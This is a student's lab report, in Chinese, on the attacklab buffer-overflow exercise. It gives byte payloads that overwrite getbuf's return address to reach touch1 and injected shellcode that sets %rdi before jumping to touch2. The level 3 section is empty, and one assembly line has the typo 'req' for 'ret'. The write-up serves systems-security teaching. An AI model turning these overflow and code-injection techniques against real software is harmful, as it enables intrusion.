# attacklab 实验报告

## CI

### 第一关

实验文档的提示以及很详细了。先找到 getbuf，发现缓冲区的长度为 24 字节；

然后找到 touch1 的地址为 `0x0000000000401695`；

只需先用任意字符串填充缓冲区的 24 字节，然后将后面 return address 的 8 个字节覆盖为 touch1 的地址即可，注意小端法。

```c
00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 00 01 02 03
95 16 40 00 00 00 00 00
```



### 第二关

这里需要在进入 touch2 之前，提前修改 %rdi 的值，我们可以在栈上注入代码；

我们需要先找到调用 Gets 函数时的栈顶地址，因为这里的栈底地址是固定为 `0x00007fffffffffff`，因此无论运行多少次，走到 Gets 的时候栈顶地址都一定是固定的；

使用 `info regi` 指令，得知此时的栈顶地址为 `0x55654c98`，我们就在这 24 字节长的缓冲区中，注入我们的攻击代码；

攻击代码的汇编形式如下：

```assembly
pushq $0x4016c1 # touch2
movq $0x3d9549ca, %rdi
req
```

使用实验文档的方式得到带有字节代码的汇编代码：

```assembly

ctarget.l2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	68 c1 16 40 00       	pushq  $0x4016c1
   5:	48 c7 c7 ca 49 95 3d 	mov    $0x3d9549ca,%rdi
   c:	c3                   	retq   

```

注入的代码的字节码为：`68 c1 16 40 00 48 c7 c7 ca 49 95 3d c3`。由于长度不足 24 字节，因此使用任意字符 `0x0a` 除外填充至 24 字节，跟上栈顶地址 `0x55654c98`。

```c
68 c1 16 40 00 48 c7 c7 ca 49 95 3d c3 00 00 00 00 00 00 00 00 00 00 00
98 4c 65 55 00 00 00 00
```



### 第三关

